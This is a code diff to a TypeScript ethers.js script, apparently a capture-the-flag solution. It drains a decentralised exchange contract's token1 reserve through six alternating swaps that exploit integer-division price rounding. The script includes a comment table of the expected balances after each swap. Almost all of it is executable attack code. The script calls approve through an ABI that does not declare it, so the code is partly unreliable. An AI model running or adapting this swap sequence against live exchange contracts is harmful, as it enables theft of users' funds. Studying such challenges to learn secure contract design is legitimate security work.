@@ -12,6 +12,7 @@ const attackDex = async () => {
     // You may read more on:
     // https://eips.ethereum.org/EIPS/eip-20
     // https://docs.soliditylang.org/en/v0.8.11/types.html#division
+    // after swapping several times you'll see that you have more tokens
 
     // TODO: automate token address getting from contract
     // experimental below to get token1 and token2 address
@@ -29,6 +30,37 @@ const attackDex = async () => {
     // const t2 = await contractAttack.token2();
     // console.log(t1);
     // console.log(t2);
+
+    const ABI = [
+        "function token1() public view returns (address);",
+        "function token2() public view returns (address);",
+        "function swap(address from, address to, uint amount)",
+        "function balanceOf(address token, address account)",
+    ];
+    const contractAttack = await ethers.getContractAt(ABI, dexAddress);
+    const tx = await contractAttack.approve(dexAddress, 500);
+    // sample table below of continous swap
+    // DEX       |        player
+    // token1 - token2 | token1 - token2
+    // ----------------------------------
+    //   100     100   |   10      10
+    //   110     90    |   0       20
+    //   86      110   |   24      0
+    //   110     80    |   0       30
+    //   69      110   |   41      0
+    //   110     45    |   0       65
+    //   0       90    |   110     20
+    // execution below
+    const swap1 = await contractAttack.swap(token1Address, token2Address, 10);
+    const swap2 = await contractAttack.swap(token2Address, token1Address, 20);
+    const swap3 = await contractAttack.swap(token1Address, token2Address, 24);
+    const swap4 = await contractAttack.swap(token2Address, token1Address, 30);
+    const swap5 = await contractAttack.swap(token1Address, token2Address, 41);
+    const swap6 = await contractAttack.swap(token2Address, token1Address, 45);
+    // conslusion check balance
+    const token1Balance = await contractAttack
+        .balanceOf(token1Address, dexAddress)
+        .then((v: any) => v.toString());
 };
 
 attackDex()
